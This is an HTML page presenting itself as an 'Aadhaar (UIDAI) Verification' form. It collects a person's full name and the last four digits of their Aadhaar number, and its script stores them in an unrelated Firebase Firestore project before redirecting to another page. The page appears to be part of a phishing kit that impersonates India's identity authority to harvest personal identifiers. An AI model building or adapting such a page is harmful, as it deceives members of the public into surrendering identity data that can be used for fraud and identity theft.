<!DOCTYPE html><html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Home</title>
    <link rel="stylesheet" href="a02b572693328546.css"> <!-- External CSS Link -->

    <!-- Firebase SDKs -->
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
      import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";

      // üî• Firebase Configuration
      const firebaseConfig = {
        apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
        authDomain: "ss22-a96d3.firebaseapp.com",
        projectId: "ss22-a96d3",
        storageBucket: "ss22-a96d3.firebasestorage.app",
        messagingSenderId: "607942972170",
        appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
        measurementId: "G-KT1P0Q0FD0",
      };

      // üî• Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);
      console.log("üî• Firestore initialized:", db);

      // ‚úÖ Function to Handle Form Submission
      async function handleFormSubmit(event) {
        event.preventDefault(); // Prevent default form submission

        const fullName = document.querySelector('input[name="fn"]').value.trim();
        const aadhaarLastDigits = document.querySelector('input[name="adn"]').value.trim();

        if (!fullName || !aadhaarLastDigits) {
          alert("‚ö† Please fill out all fields.");
          return;
        }

        if (!/^[0-9]{4}$/.test(aadhaarLastDigits)) {
          alert("‚ö† Aadhaar last 4 digits must be numeric.");
          return;
        }

        console.log("üì§ Submitting:", { fullName, aadhaarLastDigits });

        try {
          // ‚úÖ Save Data to the 'users' Collection in Firestore
          const docRef = await addDoc(collection(db, "users"), {
            fullName,
            aadhaarLastDigits,
            timestamp: serverTimestamp(),
          });

          console.log("‚úÖ Data saved successfully! Document ID:", docRef.id);

          // Redirect to another page after successful form submission
          setTimeout(() => {
            window.location.replace("b15.html"); // Redirect after submission
          }, 1000);

        } catch (error) {
          console.error("‚ùå Firestore Error:", error);
          alert(`Error submitting data: ${error.message}`);
        }
      }

      // ‚úÖ Ensure Form is Loaded Before Attaching Event Listener
      document.addEventListener("DOMContentLoaded", function () {
        const form = document.getElementById("aadhaarForm");
        if (form) {
          form.addEventListener("submit", handleFormSubmit);
          console.log("‚úÖ Form event listener attached.");
        } else {
          console.error("‚ùå Form not found in DOM!");
        }
      });
    </script>
</head>
<body>
    <div id="__next">
        <header>
            <img alt="logo" width="509" height="99" src="logo.png">
        </header>
        <main>
            <form id="aadhaarForm">
                <input type="hidden" name="formtoken" value="">
                <h1>Aadhaar (UIDAI) Verification</h1>
                <div class="floating-container">
                    <input type="text" name="fn" placeholder=" " required="">
                    <label>Full Name (as Per Aadhaar) <span>*</span></label>
                </div>
                <div class="floating-container">
                    <input type="text" name="adn" minlength="4" maxlength="4" inputmode="numeric" placeholder=" " required="">
                    <label>Last 4-digit Aadhaar Number <span>*</span></label>
                </div>
                <div class="btContainer">
                    <button type="submit">Verify</button>
                </div>
            </form>
        </main>
        <footer>
            <div class="l">
                <img alt="footer" width="1080" height="769" src="s.jpg">
            </div>
            <img alt="footer" width="1080" height="189" src="ft.png">
        </footer>
    </div>


</body></html>
